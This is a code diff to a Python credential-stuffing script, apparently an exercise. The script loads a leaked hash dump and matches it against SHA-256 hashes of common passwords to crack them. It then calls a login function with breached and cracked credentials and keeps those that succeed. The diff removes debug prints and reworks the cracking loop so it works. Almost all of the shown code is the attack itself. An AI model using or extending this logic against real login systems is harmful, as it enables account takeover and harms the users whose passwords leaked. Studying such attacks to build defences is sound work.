@@ -46,12 +46,10 @@ def create_common_pass_hash(common_pass):
     h = hl.sha256()
     for password in common_pass:
         common_hash[hash_sha256(password[0])] = password[0]
-        #common_hash[hl.sha256(password[0].encode()).hexdigest()] = password[0]
     return common_hash
 
 def credential_stuffing_attack(creds):
     hashed_breach = load_hashed_breach(HASHED_PASSWORDS_PATH)
-    pprint.pprint(hashed_breach)
 
     common_pass = load_common_passwords(COMMON_PASSWORD_HASH)
     comm_pass_hash = create_common_pass_hash(common_pass) 
@@ -61,13 +59,10 @@ def credential_stuffing_attack(creds):
         password = user_pass[1]
         if attempt_login(username ,password):
             successful_creds.append(user_pass)
-        #usernames not in hashed_breach
-        elif(True):
-            print(username)
-            #username in hashed_breach):
-            if( hashed_breach[username] in common_pass):
-                if(attempt_login(username , comm_pass_hash[hashed_breach[username].hexdigest()])):
-                    successful_creds.append(user_pass)
+    for user in hashed_breach:
+        if (hashed_breach[user] in comm_pass_hash):
+            if( attempt_login(user, comm_pass_hash[hashed_breach[user]])):
+                successful_creds.append((user, comm_pass_hash[hashed_breach[user]]))
     return successful_creds 
 
 def main():
